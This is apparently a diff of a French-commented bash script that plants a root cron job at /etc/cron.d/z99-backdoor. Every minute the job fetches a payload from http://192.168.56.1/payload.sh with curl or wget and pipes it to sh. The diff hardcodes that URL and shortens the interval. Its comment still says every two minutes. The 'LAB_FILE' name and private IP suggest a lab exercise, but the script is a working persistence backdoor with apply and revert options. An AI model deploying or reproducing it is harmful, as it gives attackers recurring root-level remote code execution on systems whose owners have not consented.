@@ -2,13 +2,12 @@
 set -euo pipefail
 
 LAB_FILE="/etc/cron.d/z99-backdoor"    
-CRON_SPEC="*/2 * * * *"                  #toutes les 2 minutes
+CRON_SPEC="*/1 * * * *"                  #toutes les 2 minutes
 CRON_USER="root"                         
 SHELL_BIN="/bin/sh"                  
 PATH_SAFE="/usr/sbin:/usr/bin:/sbin:/bin"
 
 DEFAULT_URL="http://192.168.56.1/payload.sh"
-PAYLOAD_URL="${1:-$DEFAULT_URL}"
 
 log() { echo "[$(date +'%F %T')] $*"; }
 
@@ -33,9 +32,9 @@ have() { command -v "$1" >/dev/null 2>&1; }
 
 choose_fetcher() {
   if have curl; then
-    echo "curl -fsSL '$PAYLOAD_URL' | $SHELL_BIN"
+    echo "curl -fsSL '$DEFAULT_URL' | $SHELL_BIN"
   elif have wget; then
-    echo "wget -qO- '$PAYLOAD_URL' | $SHELL_BIN"
+    echo "wget -qO- '$DEFAULT_URL' | $SHELL_BIN"
   else
     log "Erreur: il faut 'curl' ou 'wget'."
     exit 1
@@ -91,7 +90,7 @@ status_file() {
 
 main() {
   case "${1:-}" in
-    --apply)  shift; [[ $# -ge 1 ]] && PAYLOAD_URL="$1"; apply_changes "$@";;
+    --apply) apply_changes "$@";;
     --revert) revert_changes ;;
     --status) status_file ;;
     *) usage; exit 1 ;;
